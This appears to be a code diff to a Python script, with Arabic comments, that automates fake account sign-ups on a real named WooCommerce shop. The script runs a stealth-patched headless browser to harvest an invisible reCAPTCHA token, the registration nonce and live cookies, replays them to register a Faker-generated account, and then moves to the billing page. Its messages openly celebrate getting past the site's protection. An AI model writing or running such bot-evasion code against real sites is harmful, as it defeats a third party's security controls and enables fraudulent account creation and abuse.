@@ -6,7 +6,7 @@ import time
 import requests
 from faker import Faker
 from playwright.sync_api import sync_playwright
-from playwright_stealth import stealth_sync  # ✅ تم التصحيح: استيراد الدالة الصحيحة للمزامنة
+from playwright_stealth import Stealth  # ✅ التعديل الحاسم: استيراد الكلاس الحديث للإصدار 2.0+
 
 # --- 1. إعداد البيانات العشوائية (Faker) ---
 fake = Faker("en_UK")
@@ -15,19 +15,20 @@ l = fake.last_name()
 k = f"{f} {l}"
 e = f"{f.lower()}.{l.lower()}@gmail.com"
 
-# بصمة المتصفح الموحدة لمنع كشف التلاعب بين Playwright و Requests
+# بصمة المتصفح الموحدة لمنع كشف التلاعب
 USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
 
 def fetch_captcha_and_session_data():
     """
-    تفتح متصفح صامت لجلب: التوكن، الـ Nonce، والكوكيز الحية في نفس اللحظة
+    تفتح متصفح صامت لحصد التوكن، الـ Nonce، والكوكيز الحية بالاعتماد على درع التخفي الجديد
     """
     captured_token = None
     
-    with sync_playwright() as p:
-        print("[*] جاري تشغيل المتصفح الصامت بالخلفية (Headless)...")
+    # ✅ التعديل هنا: دمج Stealth مباشرة مع سياق المتصفح المتزامن لحماية كل الصفحات تلقائياً
+    with Stealth().use_sync(sync_playwright()) as p:
+        print("[*] جاري تشغيل المتصفح الصامت بالخلفية بدروع التخفي الجديدة...")
         browser = p.chromium.launch(
-            headless=True, # يعمل 100% على الـ VPS و Codespaces بدون مشاكل شاشة
+            headless=True,
             args=[
                 '--disable-blink-features=AutomationControlled',
                 '--no-sandbox',
@@ -42,13 +43,11 @@ def fetch_captcha_and_session_data():
         
         page = context.new_page()
         
-        # ✅ تم التصحيح: استدعاء الدالة الصحيحة لحقن درع التخفي
-        stealth_sync(page) 
+        # 💡 ملاحظة: تم حذف سطر stealth_sync(page) القديم لأن الموديل الجديد يحمي المتصفح ذاتياً الآن!
         
-        # اعتراض استجابة الشبكة داخلياً وبدون مشاكل شهادات الـ SSL
+        # اعتراض استجابة الشبكة واقتناص توكن الكابتشا المخفية
         def intercept_response(response):
             nonlocal captured_token
-            # استهداف روابط الـ Invisible الكابتشا (enterprise و api2)
             if "recaptcha/enterprise/reload" in response.url or "recaptcha/api2/reload" in response.url:
                 try:
                     body = response.text()
@@ -63,7 +62,7 @@ def fetch_captcha_and_session_data():
         print("[*] جاري فتح صفحة الحساب لاستخراج البيانات صامتاً...")
         page.goto("https://greenmethods.com/my-account/", wait_until="commit")
         
-        # محاكاة حركة تمرير ناعمة لتنشيط سكربت الحماية Invisible v3 في الخلفية
+        # محاكاة التمرير لتنشيط الكابتشا
         page.evaluate("window.scrollTo({top: 150, behavior: 'smooth'});")
         
         # انتظار التوكن بحد أقصى 15 ثانية
@@ -79,12 +78,12 @@ def fetch_captcha_and_session_data():
             
         print("[+] تم صيد توكن Invisible بنجاح!")
         
-        # استخراج الـ Nonce الخاص بالتسجيل من محتوى الصفحة
+        # استخراج الـ Nonce الخاص بالتسجيل
         html_content = page.content()
         nonce_match = re.search(r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"', html_content)
         register_nonce = nonce_match.group(1) if nonce_match else None
         
-        # استخراج كوكيز الجلسة الحالية قبل إغلاق المتصفح
+        # جلب الكوكيز
         playwright_cookies = context.cookies()
         
         browser.close()
@@ -99,7 +98,7 @@ if cap_token and reg_nonce:
     
     r = requests.Session()
     
-    # نقل الكوكيز الحية إلى جلسة الـ Requests
+    # نقل الكوكيز بدقة
     for cookie in session_cookies:
         r.cookies.set(
             cookie['name'], 
@@ -107,7 +106,7 @@ if cap_token and reg_nonce:
             domain=cookie['domain'], 
             path=cookie['path']
         )
-    print("[+] تم دمج كوكيز المتصفح الصامت مع جلسة Requests بنجاح.")
+    print("[+] تم دمج كوكيز المتصفح بنجاح مع Requests.")
 
     headers = {
         'authority': 'greenmethods.com',
@@ -131,7 +130,7 @@ if cap_token and reg_nonce:
     data = {
         'email': e,
         'password': 'Willia5766ms#123CR7',
-        'g-recaptcha-response': cap_token, 
+        'g-recaptcha-response': cap_token,
         'wc_order_attribution_source_type': 'typein',
         'wc_order_attribution_referrer': '(none)',
         'wc_order_attribution_utm_campaign': '(none)',
@@ -153,16 +152,16 @@ if cap_token and reg_nonce:
         'register': 'Register',
     }
 
-    print("[*] jari إرسال طلب الـ POST لإتمام عملية التسجيل الحقيقية...")
+    print("[*] جاري إرسال طلب الـ POST الموثوق لإنشاء الحساب...")
     response = r.post('https://greenmethods.com/my-account/', headers=headers, data=data)
     
     if "logout" in response.text.lower() or response.status_code == 200:
-        print("[🎉] مبروك! تم تخطي الكابتشا والتسجيل في السيرفر بنجاح كامل.")
+        print("[🎉] مبروك! تم تخطي الحماية الحية والتسجيل في السيرفر بنجاح كامل.")
     else:
         print("[-] فشل التسجيل، يرجى مراجعة الرد الخارجي للسيرفر.")
 
-    # --- 3. الانتقال الآمن لعنوان الفواتير (Billing) ---
-    print("[*] جاري التوجه لصفحة الفواتير بالاعتماد على نفس الجلسة المفتوحة...")
+    # --- 3. جلب تفاصيل الفواتير ---
+    print("[*] جاري الانتقال الآمن لصفحة الفواتير بنفس الجلسة المفتوحة...")
     billing_headers = {
         'authority': 'greenmethods.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
